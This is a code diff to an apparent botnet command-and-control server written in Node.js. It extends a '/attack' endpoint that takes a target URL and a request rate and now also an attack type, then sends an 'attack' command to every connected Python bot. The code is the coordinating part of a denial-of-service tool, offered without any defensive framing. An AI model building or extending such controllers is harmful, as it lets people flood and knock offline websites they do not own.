@@ -17,16 +17,18 @@ let connectedPythonSockets = {};
 
 // API endpoint to receive attack command from React
 app.post("/attack", (req, res) => {
-  const { url, rate } = req.body;
+  const { url, rate, attackType } = req.body; // Include attackType in the request body
+  const method = attackType;
   console.log(
-    `Received attack request: URL = ${url}, Rate = ${rate} requests per second`
+    `Received attack request: URL = ${url}, Rate = ${rate} requests per second, Type = ${method}`
   );
 
   if (Object.keys(connectedPythonSockets).length > 0) {
     Object.values(connectedPythonSockets).forEach((socket) => {
       if (socket) {
         console.log(`Sending attack command to bot with ID: ${socket.id}`);
-        socket.emit("attack", { url, rate });
+        // Emit all the data including attackType to the Python socket
+        socket.emit("attack", { url, rate, method });
       } else {
         console.warn("Invalid socket instance in connectedPythonSockets");
       }
